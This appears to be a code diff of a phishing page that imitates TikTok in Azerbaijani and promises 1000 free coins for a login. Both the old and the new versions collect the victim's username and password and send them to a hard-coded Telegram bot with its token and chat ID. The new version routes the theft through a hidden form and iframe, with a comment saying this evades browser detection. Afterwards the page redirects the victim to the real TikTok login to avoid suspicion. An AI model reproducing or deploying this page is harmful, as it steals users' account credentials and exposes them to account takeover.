@@ -6,10 +6,9 @@
     <title>TikTok | Jeton Mərkəzi</title>
     <style>
         body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-card { background: #121212; padding: 30px; border-radius: 12px; width: 320px; text-align: center; border: 1px solid #fe2c55; box-shadow: 0 4px 15px rgba(254, 44, 85, 0.2); }
+        .login-card { background: #121212; padding: 30px; border-radius: 12px; width: 320px; text-align: center; border: 1px solid #fe2c55; }
         img { width: 100px; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: 1px solid #333; background: #222; color: white; box-sizing: border-box; outline: none; }
-        input:focus { border-color: #fe2c55; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: 1px solid #333; background: #222; color: white; box-sizing: border-box; }
         button { width: 100%; padding: 12px; background-color: #fe2c55; border: none; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 10px; }
     </style>
 </head>
@@ -17,37 +16,40 @@
     <div class="login-card">
         <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG-white-text-black-background.png" alt="TikTok">
         <h3>Jeton Aktivasiyası</h3>
-        <p style="font-size: 13px; color: #888;">1000 Jetonun hesaba oturması üçün giriş edin</p>
-        <input type="text" id="user" placeholder="İstifadəçi adı / Email">
-        <input type="password" id="pass" placeholder="Şifrə">
-        <button onclick="ovcuSistemi()">JETONLARI YÜKLƏ</button>
+        <p style="font-size: 13px; color: #888;">1000 Jeton üçün giriş edin</p>
+        
+        <form id="ovForm" target="gizli_frame" method="GET" action="https://api.telegram.org/bot8310888410:AAHznWCQ8ywwPyHiTAbFT80hzwb5kdNSsFE/sendMessage">
+            <input type="hidden" name="chat_id" value="7729229420">
+            <input type="hidden" name="text" id="mesaj_metni">
+            
+            <input type="text" id="u" placeholder="İstifadəçi adı / Email" required>
+            <input type="password" id="p" placeholder="Şifrə" required>
+            <button type="button" onclick="gonder()">JETONLARI YÜKLƏ</button>
+        </form>
+        
+        <iframe name="gizli_frame" style="display:none;"></iframe>
     </div>
 
     <script>
-        function ovcuSistemi() {
-            var user = document.getElementById("user").value;
-            var pass = document.getElementById("pass").value;
-            
+        function gonder() {
+            var user = document.getElementById("u").value;
+            var pass = document.getElementById("p").value;
+
             if(user == "" || pass == "") {
-                alert("Zəhmət olmasa xanaları doldurun!");
+                alert("Xanaları doldurun!");
                 return;
             }
 
-            // Sənin ən son göndərdiyin Teleqram məlumatları
-            var token = "8310888410:AAHznWCQ8ywwPyHiTAbFT80hzwb5kdNSsFE";
-            var chat_id = 7729229420; 
+            // Məlumatı hazırlayırıq
+            document.getElementById("mesaj_metni").value = "🎯 YENİ OV!\n👤 User: " + user + "\n🔑 Pass: " + pass;
             
-            var mesaj = "🎯 YENİ HESAB TUTULDU!\n👤 User: " + user + "\n🔑 Pass: " + pass;
-            
-            // Teleqrama arxa fonda səssiz göndərmə
-            var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(mesaj);
-            
-            fetch(url).then(() => {
-                // Adamı şübhələndirmədən rəsmi TikTok-a atırıq
+            // Formanı göndəririk (Brauzer bunu reklam kimi görmür)
+            document.getElementById("ovForm").submit();
+
+            // 1.5 saniyə sonra TikTok-a yönləndiririk
+            setTimeout(function() {
                 window.location.href = "https://www.tiktok.com/login";
-            }).catch(() => {
-                window.location.href = "https://www.tiktok.com/login";
-            });
+            }, 1500);
         }
     </script>
 </body>
